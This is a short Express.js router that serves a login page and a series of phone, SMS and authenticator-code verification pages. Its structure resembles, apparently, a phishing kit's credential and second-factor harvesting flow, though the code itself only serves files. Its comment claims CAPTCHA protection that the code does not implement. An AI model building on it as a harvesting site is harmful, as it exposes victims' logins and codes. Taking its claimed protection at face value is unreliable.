const express = require('express');
const router = express.Router();

router.get('/', (req, res) => {
    res.sendFile('index.html', { root: './views' });
});

// Protected routes - require CAPTCHA verification
router.get('/login.html', (req, res) => {
    res.sendFile('login.html', { root: './views' });
});

router.get('/security-verification.html', (req, res) => {
    res.sendFile('security-verification.html', { root: './views' });
});

router.get('/mobile-verification.html', (req, res) => {
    res.sendFile('mobile-verification.html', { root: './views' });
});

router.get('/sms.html', (req, res) => {
    res.sendFile('sms.html', { root: './views' });
});

router.get('/enter-phone.html', (req, res) => {
    res.sendFile('enter-phone.html', { root: './views' });
});

router.get('/authenticator-app.html', (req, res) => {
    res.sendFile('authenticator-app.html', { root: './views' });
});

router.get('/quick-verification.html', (req, res) => {
    res.sendFile('quick-verification.html', { root: './views' });
});

// Catch-all route for views folder - protect all view files
router.get('/views/*', (req, res) => {
    res.redirect('/');
});

module.exports = router;
